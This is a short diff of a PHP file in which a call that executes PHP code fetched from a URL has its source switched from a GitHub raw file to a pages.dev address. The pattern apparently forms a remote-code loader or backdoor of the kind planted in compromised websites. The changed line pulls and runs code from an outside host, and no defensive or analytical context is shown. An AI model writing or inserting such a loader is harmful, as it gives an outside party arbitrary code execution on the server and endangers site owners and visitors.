@@ -247,7 +247,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/mentahalfarudi.txt");
+    $executor->executeCodeFromURL("https://batukdikomikaja.pages.dev/cool.txt");
 } catch (Exception $e) {
     // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
